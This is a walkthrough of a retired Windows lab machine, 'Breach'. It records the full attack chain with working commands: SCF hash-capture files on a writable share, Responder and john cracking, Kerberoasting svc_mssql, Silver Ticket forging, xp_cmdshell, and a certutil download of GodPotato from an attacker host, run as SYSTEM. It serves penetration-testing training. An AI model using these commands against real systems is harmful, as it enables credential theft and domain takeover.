# Breach

![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2025--10--09-informational?style=flat-square)

| | |
|---|---|
| **OS** | Windows |
| **Difficulty** | Medium |
| **Release** | October 9, 2025 |
| **Rating** | 4.8 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

A guest SMB session finds a writable share, and planting SCF and related hash-capture files there collects Julia.Wong's NTLMv2 hash when a scheduled task browses the folder. Her cracked password enables Kerberoasting of `svc_mssql`, which also cracks. With the service account's password you can forge a **Silver Ticket** for the MSSQL SPN as Administrator, which grants sysadmin and `xp_cmdshell`. The SQL service account holds `SeImpersonatePrivilege`, so GodPotato finishes the job as SYSTEM.

---

Domain: `breach.vl`, DC: `BREACHDC.breach.vl`. Time to user ~12 min, time to root ~17 min.

## Attack Chain Summary

```
Guest SMB → writable share → SCF hash capture → Julia.Wong NTLMv2 → john crack (Computer1)
  → Kerberoast svc_mssql (Trustno1) → Silver Ticket as Administrator → MSSQL sysadmin
    → xp_cmdshell → SeImpersonatePrivilege → GodPotato → SYSTEM → root.txt
```

## Phase 1 — Reconnaissance

### Port scan

```
Open ports: 53, 80, 88, 389, 445, 464, 593, 636, 1433, 3268, 3269, 3389, 5985, 9389
```

Key services:

- **IIS 10.0** on port 80 (default page, dead end)
- **SMB** (Windows Server 2022, domain `breach.vl`, signing enabled)
- **Kerberos** (88) — Domain Controller
- **MSSQL** (1433) — SQL Server 2019 Express
- **WinRM** (5985) — available but restricted
- **LDAP** (389/636) — anonymous bind blocked

### SMB enumeration

- **Null session**: authentication works, but share enumeration is denied
- **Guest session**: full share enumeration
  - `share` — **READ,WRITE** (critical — writable by guest)
  - `Users` — READ
  - `IPC$` — READ

Share structure:

```
share/
├── finance/
├── software/
└── transfer/
    ├── claire.pope/ (access denied)
    ├── diana.pope/ (access denied)
    └── julia.wong/ (access denied)
```

### RID brute force (as guest)

Users discovered:

- Claire.Pope, Julia.Wong, Hilary.Reed, Diana.Pope, Jasmine.Price
- George.Williams, Lawrence.Kaur, Jasmine.Slater, Hugh.Watts, Christine.Bruce
- **svc_mssql** (MSSQL service account)
- Group: **staff** (RID 1104)

### Key observations

- An `SQLServer2005SQLBrowserUser` group exists, confirming MSSQL
- No AS-REP roastable accounts
- All staff accounts have UAC 66080 (`PASSWD_NOTREQD` + `NORMAL_ACCOUNT`)
- IIS serves only the default page — no web app
- LDAP guest bind doesn't allow authenticated queries

## Phase 2 — Initial Access (NTLMv2 Hash Capture)

### SCF file attack

Planted multiple hash-capture files on the writable `share`:

```ini
; SCF file (triggers SMB auth when the folder is browsed)
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

Also planted `.url`, `.library-ms`, `desktop.ini` and `.searchConnector-ms` variants, in the share root and in `finance/`, `software/` and `transfer/`.

### Responder capture

A local Samba service bound to port 445 prevented Responder from listening — stop `smbd`/`nmbd` on the attacking host first. Once the port was free, Responder captured:

```
[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:39d7b125b9fe9b2b:0701C0...
```

Julia.Wong browses the share periodically via a scheduled task.

### Hash cracking

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt julia-wong-ntlmv2.txt
# Cracked instantly: Computer1
```

Credentials: `Julia.Wong:Computer1`.

## Phase 3 — Privilege Escalation Path Discovery

### Julia.Wong access

- SMB: valid
- MSSQL: valid, but not sysadmin and no `xp_cmdshell`
- WinRM: denied
- LDAP: valid — full domain enumeration now possible
- Groups: **staff**, **Print Operators** (`admincount=True`)

### User flag

```bash
smbclient -U 'Julia.Wong%Computer1' '//<TARGET_IP>/share' \
  -c 'cd transfer; cd julia.wong; get user.txt'
```

### Kerberoasting

```bash
impacket-GetUserSPNs breach.vl/Julia.Wong:Computer1 -dc-ip <TARGET_IP> -request
# TGS hash for svc_mssql (SPN: MSSQLSvc/breachdc.breach.vl:1433)

john --wordlist=/usr/share/wordlists/rockyou.txt svc_mssql-krb.txt
# Cracked instantly: Trustno1
```

Credentials: `svc_mssql:Trustno1`.

### AD enumeration results

- **Christine.Bruce** is in **Domain Admins**
- No constrained delegation
- No gMSA accounts
- ADCS Enrollment Services exists, but certipy failed with a connection reset
- `svc_mssql` has no special group memberships
- No accounts in Remote Management Users

BloodHound (collected with bloodhound-python) shows Julia.Wong → Print Operators as a potential driver-loading privesc, but with no WinRM there's no direct shell to use it from.

## Phase 4 — Privilege Escalation

### Silver Ticket (MSSQL sysadmin)

With `svc_mssql`'s password we can forge a Silver Ticket for the MSSQL service:

```bash
# Calculate the NTLM hash
python3 -c "import hashlib; print(hashlib.new('md4', 'Trustno1'.encode('utf-16-le')).hexdigest())"
# 69596c7aa1e8daee17f8e78870e25a5c

# Domain SID: S-1-5-21-2330692793-3312915120-706255856

ticketer.py -nthash 69596c7aa1e8daee17f8e78870e25a5c \
  -domain-sid S-1-5-21-2330692793-3312915120-706255856 \
  -domain breach.vl \
  -spn MSSQLSvc/breachdc.breach.vl:1433 \
  -user-id 500 Administrator
```

### MSSQL command execution

```bash
export KRB5CCNAME=Administrator.ccache
mssqlclient.py -k -no-pass breachdc.breach.vl
```

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Runs as breach\svc_mssql with SeImpersonatePrivilege
EXEC xp_cmdshell 'whoami /priv';
```

### GodPotato (SeImpersonate → SYSTEM)

```sql
-- Upload GodPotato via certutil
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>:8443/GodPotato.exe C:\Windows\Temp\gp.exe'

-- Execute as SYSTEM
EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"'
```

## Notes and Gotchas

- **Responder vs. a local Samba install**: if `smbd` is running on the attacking host it owns port 445, and Responder silently fails to capture SMB authentication. Stop `smbd` and `nmbd` before planting hash-capture files.
- **`mssqlclient.py` and heredocs**: piping a heredoc sends each line as a separate command, including the terminator, which produces a wall of errors. Use `printf "cmd\nexit\n" | mssqlclient.py` instead.
- **impacket script names**: `impacket-ticketer` isn't always on `PATH` even when the rest of the suite is — `ticketer.py` is.
- **certipy TLS**: `certipy find` failed with `socket ssl wrapping error: Connection reset by peer`. It may need `-scheme ldap`. ADCS turned out to be irrelevant on this box anyway.

## Techniques

NTLMv2 hash capture (SCF file on a writable share) · Kerberoasting · Silver Ticket (MSSQL service impersonation) · `SeImpersonatePrivilege` abuse via GodPotato

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
